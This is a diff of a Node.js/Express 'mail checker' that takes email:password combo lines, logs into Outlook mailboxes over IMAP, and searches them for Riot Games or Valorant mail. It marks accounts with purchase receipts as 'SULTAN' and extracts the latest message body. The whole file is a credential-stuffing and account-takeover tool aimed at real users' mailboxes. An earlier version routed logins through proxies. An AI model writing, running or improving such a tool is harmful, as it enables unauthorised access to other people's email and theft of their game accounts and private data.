@@ -1,88 +1,65 @@
 const express = require('express');
 const { ImapFlow } = require('imapflow');
-const path = require('path');
-
+const { simpleParser } = require('mailparser');
 const app = express();
+
 app.use(express.json());
 app.use(express.static('public'));
 
-async function checkMail(email, password, proxy) {
+async function checkMail(email, password) {
     const client = new ImapFlow({
         host: "outlook.office365.com",
         port: 993,
         secure: true,
         auth: { user: email, pass: password },
-        logger: false,
-        ...(proxy && { proxy: proxy })
+        logger: false
     });
 
     try {
         await client.connect();
-        
-        // 1. Cek INBOX
         let lock = await client.getMailboxLock('INBOX');
-        let resultData = { skins: 0, sultan: false, count: 0 };
-        
+        let result = { status: 'INVALID', count: 0, isSultan: false, preview: "No Riot Data", body: "" };
+
         try {
-            // PENCARIAN KATA KUNCI MAKSIMAL
-            let searchCriteria = {
+            // Search Strategy
+            let messages = await client.search({
                 or: [
                     { header: { field: 'from', value: 'Riot Games' } },
                     { body: 'Valorant' },
-                    { body: 'Purchase Receipt' },
-                    { body: 'Order Confirmed' },
-                    { body: 'Riot Games Payment' },
-                    { body: 'Your Riot ID has been changed' },
-                    { body: 'Welcome to Valorant' }
-                ]
-            };
-
-            let messages = await client.search(searchCriteria);
-            resultData.count = messages.length;
-
-            // 2. DETEKSI AKUN SULTAN (Jika ada bukti pembelian)
-            let sultanMessages = await client.search({
-                or: [
-                    { body: 'Purchase Receipt' },
-                    { body: 'Order Confirmed' },
-                    { body: 'Transaction Status: Success' }
+                    { body: 'Purchase Receipt' }
                 ]
             });
 
-            if (sultanMessages.length > 0) {
-                resultData.sultan = true;
+            if (messages.length > 0) {
+                result.status = 'HIT';
+                result.count = messages.length;
+                
+                // Ambil email terakhir untuk preview
+                let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
+                let parsed = await simpleParser(lastMsg.source);
+                
+                result.body = parsed.text || parsed.textAsHtml || "No readable content";
+                result.isSultan = /Purchase|Order|Receipt|Success/i.test(result.body);
+                result.preview = result.isSultan ? "⭐ SULTAN FOUND" : "Riot Data Found";
+            } else {
+                result.status = 'NO_DATA';
             }
-
         } finally {
             lock.release();
         }
-
         await client.logout();
-        
-        return { 
-            status: 'HIT', 
-            count: resultData.count,
-            isSultan: resultData.sultan,
-            preview: resultData.sultan ? "⭐ SULTAN (Purchase Found)" : "Riot Data Found"
-        };
-
+        return result;
     } catch (err) {
-        if (err.message.includes('AUP') || err.message.includes('locked')) {
-            return { status: 'LOCKED', message: 'Account Locked' };
-        }
-        return { status: 'INVALID', message: 'Login Failed' };
+        if (err.message.includes('AUP') || err.message.includes('locked')) return { status: 'LOCKED' };
+        return { status: 'INVALID' };
     }
 }
 
 app.post('/api/check', async (req, res) => {
-    const { combo, proxy } = req.body;
+    const { combo } = req.body;
     const [email, pass] = combo.split(':');
-    
-    if (!email || !pass) return res.json({ status: 'ERROR', message: 'Format Salah' });
-
-    const result = await checkMail(email, pass, proxy);
-    res.json({ ...result, combo });
+    const data = await checkMail(email, pass);
+    res.json({ ...data, combo });
 });
 
-const PORT = process.env.PORT || 7860;
-app.listen(PORT, () => console.log(`Professional Mail Searcher v1.2 Active`));
+app.listen(process.env.PORT || 7860, () => console.log("Engine ValoSync Ready"));
